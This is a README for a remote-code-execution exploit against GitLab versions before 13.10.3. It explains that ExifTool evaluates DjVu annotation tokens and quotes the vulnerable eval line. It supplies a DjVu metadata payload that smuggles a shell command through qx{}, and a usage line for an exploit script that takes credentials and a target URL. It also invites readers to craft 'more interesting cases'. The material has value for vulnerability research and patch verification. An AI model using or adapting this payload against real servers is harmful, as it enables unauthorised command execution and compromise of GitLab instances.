## Gitlab RCE version < 13.10.3

RCE exploit for gitlab version < 13.10.3

Root cause:
- When uploading image files, Gitlab Workhorse passes any files with the extensions jpg|jpeg|tiff through to ExifTool to remove any non-whitelisted tags.
- One of the supported formats is DjVu. When parsing the DjVu annotation, the tokens are evaled to "convert C escape sequences".
```
# convert C escape sequences (allowed in quoted text)
$tok = eval qq{"$tok"};
```
### Credits
- Reported by: https://hackerone.com/reports/1154542
- Refered some code from here: https://github.com/CsEnox/GitLab-Wiki-RCE

### Usage
- Example djvu file `echo_vakzz.jpg` 
- Meta data of djvu file is for proof of concept only, look into Djvu file if you want more interesting cases :) 
```
(metadata
	(Copyright "\
" . qx{echo vakzz >/tmp/vakzz} . \
" b ") )
```

```
python3 exploit.py -u <username> -p <password> -t <gitlab_url> -f <path_to_djvu_file>
```

Tested on version 13.10.1-ce.0
